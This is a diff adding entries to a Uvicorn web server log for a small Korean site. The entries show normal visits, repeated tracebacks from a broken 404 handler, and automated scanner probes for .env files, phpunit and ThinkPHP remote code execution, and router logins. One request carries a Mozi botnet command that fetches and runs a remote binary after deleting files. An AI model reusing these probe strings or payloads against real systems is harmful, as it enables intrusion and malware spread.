@@ -3851,3 +3851,204 @@ ERROR:    Error loading ASGI app. Attribute "app" not found in module "app".
 INFO:     Started server process [51384]
 INFO:     Waiting for application startup.
 INFO:     Application startup complete.
+INFO:     Will watch for changes in these directories: ['/home/gumeisbuy/web']
+INFO:     Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)
+INFO:     Started reloader process [38831] using StatReload
+INFO:     Started server process [38833]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     180.233.200.112:0 - "GET /%EA%B2%80%EC%83%89%EC%83%81%EC%9C%84%EC%A2%85%EB%AA%A9 HTTP/1.0" 200 OK
+INFO:     180.233.200.112:0 - "GET / HTTP/1.0" 200 OK
+INFO:     51.222.253.13:0 - "GET /category/%ED%97%AC%EC%8A%A4_%EA%B1%B4%EA%B0%95%EC%8B%9D%ED%92%88 HTTP/1.0" 200 OK
+INFO:     45.90.161.148:0 - "POST /boaform/admin/formLogin HTTP/1.0" 400 Bad Request
+INFO:     45.61.186.139:0 - "GET /config/getuser?index=0 HTTP/1.0" 400 Bad Request
+INFO:     152.32.249.159:0 - "GET / HTTP/1.0" 400 Bad Request
+INFO:     104.198.149.33:0 - "GET / HTTP/1.0" 200 OK
+INFO:     23.106.22.118:0 - "GET /assets/%EA%B5%AC%EB%A9%94%EA%B5%AC%EB%A9%94.ico HTTP/1.0" 200 OK
+INFO:     128.14.141.34:0 - "GET / HTTP/1.0" 400 Bad Request
+INFO:     209.141.41.193:0 - "GET / HTTP/1.0" 200 OK
+INFO:     209.141.41.193:0 - "GET /favicon.ico HTTP/1.0" 500 Internal Server Error
+ERROR:    Exception in ASGI application
+Traceback (most recent call last):
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/exceptions.py", line 82, in __call__
+    await self.app(scope, receive, sender)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/routing.py", line 699, in __call__
+    await self.default(scope, receive, send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/routing.py", line 593, in not_found
+    raise HTTPException(status_code=404)
+starlette.exceptions.HTTPException
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/uvicorn/protocols/http/h11_impl.py", line 403, in run_asgi
+    result = await app(self.scope, self.receive, self.send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/uvicorn/middleware/proxy_headers.py", line 78, in __call__
+    return await self.app(scope, receive, send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/applications.py", line 124, in __call__
+    await self.middleware_stack(scope, receive, send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/middleware/errors.py", line 184, in __call__
+    raise exc
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/middleware/errors.py", line 162, in __call__
+    await self.app(scope, receive, _send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/middleware/trustedhost.py", line 51, in __call__
+    await self.app(scope, receive, send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/middleware/cors.py", line 84, in __call__
+    await self.app(scope, receive, send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/middleware/gzip.py", line 24, in __call__
+    await responder(scope, receive, send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/middleware/gzip.py", line 43, in __call__
+    await self.app(scope, receive, self.send_with_gzip)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/exceptions.py", line 101, in __call__
+    response = await handler(request, exc)
+  File "/home/gumeisbuy/web/./app/exceptions/handlers.py", line 11, in not_found
+    return HTMLResponse(content=HTML_404_PAGE, status_code=exc.status_code)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/responses.py", line 49, in __init__
+    self.body = self.render(content)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/responses.py", line 57, in render
+    return content.encode(self.charset)
+AttributeError: 'ellipsis' object has no attribute 'encode'
+INFO:     8.26.182.26:0 - "GET / HTTP/1.0" 400 Bad Request
+INFO:     8.26.182.26:0 - "GET /favicon.ico HTTP/1.0" 400 Bad Request
+WARNING:  Invalid HTTP request received.
+INFO:     23.111.114.116:0 - "GET / HTTP/1.0" 200 OK
+INFO:     23.111.114.116:0 - "GET / HTTP/1.0" 200 OK
+INFO:     185.196.220.70:0 - "GET / HTTP/1.0" 400 Bad Request
+INFO:     20.212.232.165:0 - "GET /.env HTTP/1.0" 400 Bad Request
+INFO:     20.212.232.165:0 - "POST / HTTP/1.0" 400 Bad Request
+INFO:     20.212.232.165:0 - "GET /.env HTTP/1.0" 400 Bad Request
+INFO:     20.212.232.165:0 - "POST / HTTP/1.0" 400 Bad Request
+INFO:     34.207.194.89:0 - "HEAD / HTTP/1.0" 200 OK
+INFO:     34.207.194.89:0 - "GET / HTTP/1.0" 200 OK
+INFO:     34.207.194.89:0 - "GET /assets/????.ico HTTP/1.0" 500 Internal Server Error
+ERROR:    Exception in ASGI application
+Traceback (most recent call last):
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/exceptions.py", line 82, in __call__
+    await self.app(scope, receive, sender)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/routing.py", line 670, in __call__
+    await route.handle(scope, receive, send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/routing.py", line 418, in handle
+    await self.app(scope, receive, send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/staticfiles.py", line 101, in __call__
+    response = await self.get_response(path, scope)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/staticfiles.py", line 158, in get_response
+    raise HTTPException(status_code=404)
+starlette.exceptions.HTTPException
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/uvicorn/protocols/http/h11_impl.py", line 403, in run_asgi
+    result = await app(self.scope, self.receive, self.send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/uvicorn/middleware/proxy_headers.py", line 78, in __call__
+    return await self.app(scope, receive, send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/applications.py", line 124, in __call__
+    await self.middleware_stack(scope, receive, send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/middleware/errors.py", line 184, in __call__
+    raise exc
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/middleware/errors.py", line 162, in __call__
+    await self.app(scope, receive, _send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/middleware/trustedhost.py", line 51, in __call__
+    await self.app(scope, receive, send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/middleware/cors.py", line 84, in __call__
+    await self.app(scope, receive, send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/middleware/gzip.py", line 24, in __call__
+    await responder(scope, receive, send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/middleware/gzip.py", line 43, in __call__
+    await self.app(scope, receive, self.send_with_gzip)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/exceptions.py", line 101, in __call__
+    response = await handler(request, exc)
+  File "/home/gumeisbuy/web/./app/exceptions/handlers.py", line 11, in not_found
+    return HTMLResponse(content=HTML_404_PAGE, status_code=exc.status_code)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/responses.py", line 49, in __init__
+    self.body = self.render(content)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/responses.py", line 57, in render
+    return content.encode(self.charset)
+AttributeError: 'ellipsis' object has no attribute 'encode'
+INFO:     54.227.32.154:0 - "GET / HTTP/1.0" 200 OK
+INFO:     20.55.32.132:0 - "GET /.env HTTP/1.0" 400 Bad Request
+INFO:     20.55.32.132:0 - "POST / HTTP/1.0" 400 Bad Request
+INFO:     54.36.149.8:0 - "GET /robots.txt HTTP/1.0" 200 OK
+INFO:     51.222.253.4:0 - "GET /category/%ED%99%88%EC%9D%B8%ED%85%8C%EB%A6%AC%EC%96%B4 HTTP/1.0" 200 OK
+INFO:     20.212.232.165:0 - "GET /.env HTTP/1.0" 400 Bad Request
+INFO:     20.212.232.165:0 - "POST / HTTP/1.0" 400 Bad Request
+INFO:     45.61.186.139:0 - "GET /config/getuser?index=0 HTTP/1.0" 400 Bad Request
+INFO:     213.202.208.179:0 - "GET /invoker/readonly HTTP/1.0" 400 Bad Request
+INFO:     213.202.208.179:0 - "POST /_ignition/execute-solution HTTP/1.0" 400 Bad Request
+INFO:     213.202.208.179:0 - "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 400 Bad Request
+INFO:     213.202.208.179:0 - "GET / HTTP/1.0" 400 Bad Request
+INFO:     213.202.208.179:0 - "GET /script HTTP/1.0" 400 Bad Request
+INFO:     213.202.208.179:0 - "GET /login HTTP/1.0" 400 Bad Request
+INFO:     213.202.208.179:0 - "GET /jenkins/login HTTP/1.0" 400 Bad Request
+INFO:     213.202.208.179:0 - "GET /manager/html HTTP/1.0" 400 Bad Request
+INFO:     213.202.208.179:0 - "GET /?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=bhok2orb HTTP/1.0" 400 Bad Request
+INFO:     223.25.103.42:0 - "GET / HTTP/1.0" 400 Bad Request
+INFO:     205.210.31.144:0 - "GET / HTTP/1.0" 400 Bad Request
+INFO:     20.212.232.165:0 - "GET /.env HTTP/1.0" 400 Bad Request
+INFO:     20.212.232.165:0 - "POST / HTTP/1.0" 400 Bad Request
+INFO:     128.1.248.42:0 - "GET / HTTP/1.0" 400 Bad Request
+INFO:     106.139.125.75:0 - "HEAD / HTTP/1.0" 200 OK
+INFO:     34.207.194.89:0 - "GET / HTTP/1.0" 200 OK
+INFO:     34.207.194.89:0 - "GET /assets/????.ico HTTP/1.0" 500 Internal Server Error
+ERROR:    Exception in ASGI application
+Traceback (most recent call last):
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/exceptions.py", line 82, in __call__
+    await self.app(scope, receive, sender)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/routing.py", line 670, in __call__
+    await route.handle(scope, receive, send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/routing.py", line 418, in handle
+    await self.app(scope, receive, send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/staticfiles.py", line 101, in __call__
+    response = await self.get_response(path, scope)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/staticfiles.py", line 158, in get_response
+    raise HTTPException(status_code=404)
+starlette.exceptions.HTTPException
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/uvicorn/protocols/http/h11_impl.py", line 403, in run_asgi
+    result = await app(self.scope, self.receive, self.send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/uvicorn/middleware/proxy_headers.py", line 78, in __call__
+    return await self.app(scope, receive, send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/applications.py", line 124, in __call__
+    await self.middleware_stack(scope, receive, send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/middleware/errors.py", line 184, in __call__
+    raise exc
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/middleware/errors.py", line 162, in __call__
+    await self.app(scope, receive, _send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/middleware/trustedhost.py", line 51, in __call__
+    await self.app(scope, receive, send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/middleware/cors.py", line 84, in __call__
+    await self.app(scope, receive, send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/middleware/gzip.py", line 24, in __call__
+    await responder(scope, receive, send)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/middleware/gzip.py", line 43, in __call__
+    await self.app(scope, receive, self.send_with_gzip)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/exceptions.py", line 101, in __call__
+    response = await handler(request, exc)
+  File "/home/gumeisbuy/web/./app/exceptions/handlers.py", line 11, in not_found
+    return HTMLResponse(content=HTML_404_PAGE, status_code=exc.status_code)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/responses.py", line 49, in __init__
+    self.body = self.render(content)
+  File "/home/gumeisbuy/miniconda3/lib/python3.9/site-packages/starlette/responses.py", line 57, in render
+    return content.encode(self.charset)
+AttributeError: 'ellipsis' object has no attribute 'encode'
+INFO:     54.227.32.154:0 - "GET / HTTP/1.0" 200 OK
+INFO:     120.86.239.253:0 - "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.0" 400 Bad Request
+INFO:     185.196.220.70:0 - "GET / HTTP/1.0" 400 Bad Request
+INFO:     178.204.133.56:0 - "GET / HTTP/1.0" 400 Bad Request
+INFO:     45.61.186.139:0 - "GET /config/getuser?index=0 HTTP/1.0" 400 Bad Request
+INFO:     162.142.125.9:0 - "GET / HTTP/1.0" 400 Bad Request
+INFO:     162.142.125.9:0 - "GET / HTTP/1.0" 400 Bad Request
+INFO:     66.249.70.62:0 - "GET /assets/%EA%B5%AC%EB%A9%94%EA%B5%AC%EB%A9%94.ico HTTP/1.0" 304 Not Modified
+INFO:     45.90.161.148:0 - "POST /boaform/admin/formLogin HTTP/1.0" 400 Bad Request
+INFO:     37.0.8.116:0 - "POST /boaform/admin/formLogin HTTP/1.0" 400 Bad Request
+INFO:     180.233.200.112:0 - "GET / HTTP/1.0" 200 OK
+INFO:     180.233.200.112:0 - "GET /css/styles.css HTTP/1.0" 304 Not Modified
+INFO:     180.233.200.112:0 - "GET /js/scripts.js HTTP/1.0" 304 Not Modified
+INFO:     180.233.200.112:0 - "GET /%EA%B8%80%EC%9E%90%EC%88%98%EC%84%B8%EA%B8%B0 HTTP/1.0" 200 OK
+INFO:     180.233.200.112:0 - "POST /%EA%B8%80%EC%9E%90%EC%88%98%EC%84%B8%EA%B8%B0 HTTP/1.0" 200 OK
+INFO:     180.233.200.112:0 - "POST /%EA%B8%80%EC%9E%90%EC%88%98%EC%84%B8%EA%B8%B0 HTTP/1.0" 200 OK
+INFO:     180.233.200.112:0 - "POST /%EA%B8%80%EC%9E%90%EC%88%98%EC%84%B8%EA%B8%B0 HTTP/1.0" 200 OK
+INFO:     180.233.200.112:0 - "POST /%EA%B8%80%EC%9E%90%EC%88%98%EC%84%B8%EA%B8%B0 HTTP/1.0" 200 OK
